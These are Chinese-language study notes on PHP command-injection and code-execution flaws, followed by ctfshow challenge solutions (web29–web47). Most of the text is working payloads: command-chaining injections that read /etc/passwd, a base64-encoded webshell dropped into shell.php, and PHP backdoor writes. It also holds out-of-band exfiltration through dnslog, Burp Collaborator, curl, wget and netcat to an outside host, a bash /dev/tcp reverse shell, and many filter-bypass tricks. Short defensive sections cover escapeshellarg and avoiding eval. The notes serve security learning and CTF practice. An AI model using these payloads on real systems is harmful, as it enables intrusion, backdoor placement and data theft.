# 命令执行

## 基础

程序员使用脚本语言(比如 PHP)开发应用程序过程中，脚本语言开发十分快速、简洁，方便，但是也伴随着一些问题。比如说速度慢，或者无法接触系统底层，如果我们开发的应用,特别是企业级的一些应用需要去调用一些外部程序。**当应用需要调用一些外部程序时就会用到一些执行系统命令的函数**。应用在调用这些函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入的情况下，就会造成命令执行漏洞

在 PHP 中相关函数：

```php
system(args) 有回显
passthru(args)(有回显)
exec(args) （回显最后一行-必须 echo 输出）
shell_exec(args) （无回显-必须输出）
反引号：``
popen(handle,mode)(无回显)
proc_open('cmd','flag','flag')（无回显）
$process = proc_open('dir',$des,$pipes);
echo stream_get_contents($pipes[1]);
```

代码分析 （pikachu）：

```php
if(isset($_POST['submit']) && $_POST['ipaddress']!=null){
    $ip=$_POST['ipaddress'];
//     $check=explode('.', $ip);可以先拆分，然后校验数字以范围，第一位和第四位1-255，中间两位0-255
    if(stristr(php_uname('s'), 'windows')){
//         var_dump(php_uname('s'));
        
        $result.=shell_exec('ping '.$ip);//直接将变量拼接进来，没做处理
    }else {
        $result.=shell_exec('ping -c 4 '.$ip);
    }
}
```

## 攻击技巧

### ;（分号）

命令按照顺序（从左到右）被执行，并且可以用分号进行分隔。当有一条命令执行失败时，不会中断其它命令的执行

```
ping -c 1 127.0.0.1;whoami
```

### | (管道符号)

通过管理符 可以将一个命令的标准输出管理为另外一个命令的标准输入，当它失败后，会执行另外一条命令

```
ping -c 1 127.0.0.1|whoami
```

### & (后台任务符号)

命令按照顺序（从左到右）被执行，跟分号作用一样；此符号作用是后台任务符号使shell 在后台执行该任务，这样用户就可以立即得到一个提示符并继续其他工作

```
ping -c 4 127.0.0.1&cat /etc/passwd&
```

### &&（逻辑与）

前后的命令的执行存在逻辑与关系，只有【&&】前面的命令执行成功后，它后面的命令才被执行

```
ping -c 4 127.0.0.1&&whoami
```

### ||（逻辑或） 

前后命令的执行存在逻辑或关系，只有【||】前面的命令执行失败后，它后面的命令才被执行；

```
ping -c ||whoami
```

### `（反引号）

当一个命令被解析时，它首先会执行反引号之间的操作。例如执行 echo `ls -a` 将会首先执行ls 并捕获其输出信息。然后再将它传递给 echo，并将 ls 的输出结果打印在屏幕上，这被称为命令替换

```
echo `whoami`
```

<img src="图片\Snipaste_2023-02-04_10-15-33.png" alt="Snipaste_2023-02-04_10-15-33" style="zoom:80%;" />

### $(command) 命令执行

这是命令替换的不同符号。**当反引号被过滤或编码时**，可能会更有效

```
ping -c 4 127.0.0.1 $(whoami)
```

### win 命令链接符

| & || && 跟 linux 一样

有回显的 

发现命令执行漏洞，如果是回显的情况下，获取系统敏感信息

```
win 操作系统
type c:\windows\win.ini
linux 操作系统
cat /etc/passwd
```

无回显 

有回显的情况下相对交少，一般在实战环境环境中，无回显的环境较多，证明漏洞存在就需要各种**利用外通信技巧**

### 命令执行漏洞外通信技巧

利用管道符号写入 SHELL ，如果存在漏洞的页面有 web 服务器，有权限写入，利用 shell 命令写入 webshell 后门到网站目录，访问即可获取 webshell

```
echo "PD9waHAgcGhwaW5mbygpO2V2YWwoJF9QT1NUWydjbWQnXSk/Pg=="|base64 -d >shell.php
```

#### dnslog

带外通信技巧一般都是无回显的情况，使用 dnslog， dnslog 是一个显示解析记录的平台，在无回显的情况下，通过访问 dnslog，dnslog **会把你访问的子域名的头文件记录下来**

使用反引号`whoami`得到的用户名再，子域名，再使用 icmp 协议访问 ping 域名

```
ping -c 4 127.0.0.1| ping `whoami`.tmye88.dnslog.cn
```

<img src="图片\Snipaste_2023-02-04_10-27-30.png" alt="Snipaste_2023-02-04_10-27-30" style="zoom:80%;" />

#### burpsuite burpcollaborator 测试无回显

测试的原理和 dnslog 一样

使用 burpsuite 的 burpcollaborator 复制

点击 copyt to clipboard 复制测试的子域名再拼接子域名 

```
ping -c 4 127.0.0.1| ping `whoami`.xlmiw1sf16svvsbtwr5upgac137tvi.burpcollaborator.net
```

#### 利用日志测试无回显

利用 HTTP 协议，访问 WEB 中间件时，iis 或者 apache 或者小型服务，都存在访问日志。在kali 上开启python 的小型服务器。再用 curl 协议访问远程服务器 ip 的 80 端口，再到 kali 的终端查看记录即可

```
使用 curl 命令
ping -c 4 ||curl http://192.168.1.100/?`whoami`
使用 wget 命令
ping -c 4 ||wget http://192.168.1.100/?`whoami`
```

<img src="图片\Snipaste_2023-02-04_10-36-16.png" alt="Snipaste_2023-02-04_10-36-16"  />

**netcat**

如果目标系统存在有 netcat 在 ubuntu 系统都会存在的。使用命令读取文件传递到远程服务器上远程服务器监听命令

```
远程服务器监听命令
nc -lp 9999 >passwd
本地执行命令
nc 192.168.1.100 9999 </etc/passwd
```

会在查看远程服务器生成 passwd 文件

<img src="图片\Snipaste_2023-02-04_10-39-23.png" alt="Snipaste_2023-02-04_10-39-23"  />

### 命令执行 nc 反弹 shell

远程服务器 nc 监听命令 

```
nc -vlnp 8080
```

目标机器执行，选择合适的命令

```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

有很多反弹shell命令的平台   https://forum.ywhack.com/bountytips.php

## 防御

- **不执行外部的应用程序或命令**

  尽量使用自定义函数或函数库实现外部应用程序或命令的功能。在执行 system、eval 等命令执行功能的函数前，要确认参数内容

- **使用 escapeshellarg 函数处理相关参数**

  escapeshellarg 函数会将用户引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“’”，双引号“"”会被转义为“"”，分号“;”会被转义为“;”，这样 escapeshellarg 会将参数内容限制在一对单引号或双引号里面，转义参数中包括的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的

- **使用 safe_mode_exec_dir 执行可执行的文件路径**

  将 php.ini 文件中的 safe_mode 设置为 On，然后将允许执行的文件放入一个目录，并使用safe_mode_exec_dir 指定这个可执行的文件路径。这样，在需要执行相应的外部程序时，程序必须在safe_mode_exec_dir 指定的目录中才会允许执行，否则执行将失败

# 代码执行

## 基础

当应用在调用一些**字符串转化为代码的函数**时，没有考虑用户是否能控制这个字符串，将造成代码注入漏洞(代码执行漏洞)

**漏洞函数**

```
1.PHP：
eval()、assert()、preg_replace()、call_user_func()、call_user_func_array()以及array_map()等
system、shell_exec、popen、passthru、proc_open等

2.Python：
eval exec subprocess os.system commands 

3.Java：
Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，
但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等
```

区分代码执行与命令执行

```php
<?php
//eval代码执行
eval('phpinfo();');

//system命令执行
system('ipconfig');
?>
```

也可写入 web 后门

```php
fputs(fopen("shell.php","a"),"<?php eval($_POST[x]);?>");
```

### **动态代码执行**

在程序开发过程中，需要用动态调用函数，如果参数可控的情况下，会造成代码执行漏洞。

```php
<?php
function m_print(){
echo '这是一个页面';
}
$_GET['a']($_GET['b']);
?>
```

查看 php 信息 assert 可以执行 php 里面的一些函数比如 phpinfo()

```
?a=assert&b=system('ls')
```

### 正则代码执行

preg_replace 使用了 /e 模式，导致可以代码执行

```php 
<?php
$data = $_GET['data'];
preg_replace('/<data>(.*)<\/data>/e','$ret = "\\1";',$data);
?>
<form>
<label>请输入你的数据</label>
<input type='text' name='data'/>
<input type='submit' value='提交'/>
</form>
<data>{${phpinfo()}}</data>
```

## 防御

```
1、使用 json 保存数组，当读取时就不需要使用 eval 了

2、对于必须使用 eval 的地方，一定严格处理用户数据（白名单、黑名单）

3、字符串使用单引号包括可控代码，插入前使用 addslashes 转义（addslashes、魔数引号、htmlspecialchars、 htmlentities、mysql_real_escape_string）

4、放弃使用 preg_replace 的 e 修饰符，使用 preg_replace_callback()替换（preg_replace_callback()）

5、若必须使用 preg_replace 的 e 修饰符，则必用单引号包裹正则匹配出的对象（preg_replace+正则）
```

# ctfshow

以前的笔记

```
system("tac fl*g.php");      倒序tac
echo `nl fl''ag.php`;

echo `cat fl*g.ph*`;

可以尝试通过嵌套eval函数来获取另一个参数的的方法来绕过，因为这里只判断了c这个参数，并不会判断其他参数的传入
c=eval($_GET[a]);&a=system('cat flag.php');
这里注意后面是a的参数，而不是c的参数，这个payload共传递了两个参数，第一个为嵌套eval第二个为向嵌套的eval传入参数

phpinfo(); 与 phpinfo()>  php的最后一行可以不用分号，相当于闭合

c=system("cp fla?.php 1.txt");    再访问XXXX/1.txt
?和*是   占位符  ?是占一个

c=`cp fla?.??? 1.txt`;          再访问XXXX/1.txt

c=include%0a$_GET[a]?>&a=/etc/passwd   %0a是换行符，这里去掉也没关系
c=include$_GET["url"]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
使用嵌套传参，文件包含，伪协议

c=require$_GET[url]?>&url=php://filter/read=convert.base64-encode/resource=flag.php

c=data://text/plain,<?=system('tac fla*');?>
c=data://text/plain,<?php system("tac fla*");?>
c=data://text/plain,<?php system("tac fla?.php");?>
c=data://text/plain,<?php system("mv fla?.php 1.txt");?>

c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==

c=session_start();system(session_id());
passid=ls
```

## web29

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

```
?c=system('tac fla*.php');
?c=echo `nl fl''ag.php`;
?c=echo `cat fl*g.ph*`;
```

## web30

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

```
?c=echo `cat fl*g.ph*`;
?c=echo `nl fl''ag.p''hp`;
?c=echo `cat fl''ag.p''hp`;
?c=echo `cat fl*ag.p*hp`;
?c=echo `cp fl*ag.p*hp 1.txt | cat 1.txt`;
```

注意其中的exec，它的返回字符串只是外部程序执行后返回的最后一行；若需要完整的返回字符串，可以使用 **PassThru()** 这个函数

```
?c=passthru("tac fla*");
```

**假如*号被过滤了**，我们可以通过 `?c=passthru("ls");` 先获取flag.php是目标，然后再通过？来匹配单个字母，也就是fla?????匹配flag.php

```
?c=passthru("tac fla?????");
```

```
?c=echo `cp fl*ag.p*hp 1.txt | cat 1.txt`;
```

**带参数输入**，也是一种免杀思路，正则只匹配了 c 的参数值

```
?c=eval($_GET[1]);&1=system("tac flag.php");
```

## web31

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

```
?c=eval($_GET[1]);&1=system("tac flag.php");
```

```
?c=echo(`ls`);
```

可以利用已知的其他函数来凑出所需要的字符串来绕过

```
?c=show_source(next(array_reverse(scandir(pos(localeconv())))));

localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回数组第一个"."
pos():输出数组第一个元素，不改变指针；
scandir();遍历目录，这里因为参数为"."所以遍历当前目录
array_reverse():元组倒置
next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以
show_source():查看源码
```

其中%09绕过空格 ，这里需要注意括号的闭合，&的连接

```
?c=eval($_GET[1]);&1=passthru("tac%09fla*");
```

 其中$IFS$9绕过空格，注意转义$符号

```
?c=eval($_GET[1]);&1=passthru("tac\$IFS\$9fla*");
```

## web32

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

可以include，也即是包含文件，发现可以**包含日志**，于是就 UA 头写 shell 来 RCE

```
?c=include$_GET[a]?>&a=../../../../var/log/nginx/access.log
```

嵌套传参，文件包含配上伪协议。%0a为换行，这里不要也行

```
?c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php
```

## web33

```php
<?php

error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'|\`|echo|\;|\(|\"/i", $c)){
        eval($c);
    }
    
}else{
    highlight_file(__FILE__);
}
```

```
?c=include$_GET[a]?>&a=data://text/plain,<?=system('tac flag.php');?>
```

```
?c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
```

## web34~36

这几题就是正则过滤各不一样

```
?c=include$_GET[a]?>&a=data://text/plain,<?=system('tac flag.php');?>
?c=include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

## web37~39

37题题目

```php
<?php

//flag in flag.php
error_reporting(0);
if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/flag/i", $c)){
        include($c);
        echo $flag;
    
    }
        
}else{
    highlight_file(__FILE__);
}
```

包含&伪协议&通配符

```
?c=data://text/plain,<?=system('tac fla*');?>
?c=php://input     post:<?php system('tac flag.php');?>
```

```
?c=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==
```

## web40

```php
<?php

if(isset($_GET['c'])){
    $c = $_GET['c'];
    if(!preg_match("/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&|\*|\（|\）|\-|\=|\+|\{|\[|\]|\}|\:|\'|\"|\,|\<|\.|\>|\/|\?|\\\\/i", $c)){
        eval($c);
    }
        
}else{
    highlight_file(__FILE__);
}
```

**方法一：**

```
?c=print_r(get_defined_vars());
```

```
?c=eval(array_pop(next(get_defined_vars())));    //需要POST传入参数为1=system('tac fl*');
```

get_defined_vars() 返回一个包含所有已定义变量的多维数组。这些变量包括环境变量、服务器变量和用户定义的变量，例如GET、POST、FILE等等。

next()将内部指针指向数组中的下一个元素，并输出。

array_pop() 函数删除数组中的最后一个元素并返回其值

**方法二：**

```
?c=show_source(next(array_reverse(scandir(pos(localeconv()))))); //GXYCTF的禁止套娃 通过cookie获得参数进行命令执行
```

```
?c=show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者 ?c=show_source(next(array_reverse(scandir(getcwd()))));
```

getcwd() 函数返回当前工作目录。它可以代替pos(localeconv())

localeconv()：返回包含本地化数字和货币格式信息的关联数组。这里主要是返回值为数组且第一项为"."

pos():输出数组第一个元素，不改变指针；

current() 函数返回数组中的当前元素（单元）,默认取第一个值，和pos()一样

scandir() 函数返回指定目录中的文件和目录的数组。这里因为参数为"."所以遍历当前目录

array_reverse():数组逆置

next():将数组指针指向下一个，这里其实可以省略倒置和改变数组指针，直接利用[2]取出数组也可以

show_source():查看源码

pos() 函数返回数组中的当前元素的值。该函数是current()函数的别名。

每个数组中都有一个内部的指针指向它的"当前"元素，初始指向插入到数组中的第一个元素。

提示：该函数不会移动数组内部指针。

相关的方法：

current()返回数组中的当前元素的值。

end()将内部指针指向数组中的最后一个元素，并输出。

next()将内部指针指向数组中的下一个元素，并输出。

prev()将内部指针指向数组中的上一个元素，并输出。

reset()将内部指针指向数组中的第一个元素，并输出。

each()返回当前元素的键名和键值，并将内部指针向前移动。

## web41

https://blog.csdn.net/miuzzx/article/details/108569080

## web42

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    system($c." >/dev/null 2>&1"); //错误输出也在标准输出里输出
}else{
    highlight_file(__FILE__);
}
```

```
?c=ls;ls //执行了前面一个命令并回显
```

```
?c=tac fl*;ls
```

## web43

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

```
?c=tac%20f*%26%26ls  //url 编码前 ?c=tac f*&&ls
```

```
?c=nl flag.php%0a
```

```
?c=nl f*%26%26ls
```

## web44

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/;|cat|flag/i", $c)){  //比上题多过滤了空格
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

```
?c=nl f*%26%26ls
```

```
?c=tac%20f*%26%26ls
```

## web45

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| /i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

```
?c=ls%26%26ls
```

```
?c=tac%09f*%26%26ls  // %09 代替 %20
```

```
?c=nl%09f*%26%26ls
```

```
?c=echo$IFS`tac$IFS*`%0A  // $IFS 代替空格
```

## web46

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

```
?c=tac%09fla?.php%26%26ls  // ? 只占一位
```

```
?c=nl%09fla?????%26%26ls
```

```
?c=nl<fla''g.php||
```

## web47

```php
<?php

if(isset($_GET['c'])){
    $c=$_GET['c'];
    if(!preg_match("/\;|cat|flag| |[0-9]|\\$|\*|more|less|head|sort|tail/i", $c)){
        system($c." >/dev/null 2>&1");
    }
}else{
    highlight_file(__FILE__);
}
```

```
?c=nl%09fla?????%26%26ls
```

```
?c=nl<fla''g.php||
```

```
?c=tac%09fla?.php%26%26ls 
```


